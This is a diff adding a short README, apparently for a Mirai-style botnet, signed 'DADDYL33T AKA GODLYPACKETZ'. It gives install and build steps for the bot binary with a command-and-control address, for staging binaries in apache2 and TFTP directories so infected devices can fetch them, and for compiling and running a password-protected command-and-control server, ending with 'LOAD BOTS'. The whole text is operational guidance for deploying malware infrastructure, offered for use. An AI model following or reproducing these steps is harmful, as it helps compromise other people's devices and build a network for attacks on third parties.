@@ -1,0 +1,28 @@
+MADE BY DADDYL33T AKA GODLYPACKETZ
+
+INSTRUCTIONS
+
+DEPS:
+	yum groupinstall "Development Tools" -y
+	yum install screen -y
+	OR
+	apt-get install gcc screen -y
+
+BUILD THE BOT:
+     go in file bot/main.c
+     replace address and bot port and upload
+     
+   RUN
+     gcc -obuild build.c; ./build
+
+     binarys auto moved to apache2 tftp dirs & ./release folder
+
+BUILD THE CNC:
+     configure password in cnc/server.c MYMGMPORT MYMGMPASS
+     
+     run the following:
+     gcc -oserver cnc/*.c -pthread -O3
+     screen -mS server
+     ./server <bot_port from bot build> 225     
+     
+LOAD BOTS !!!!
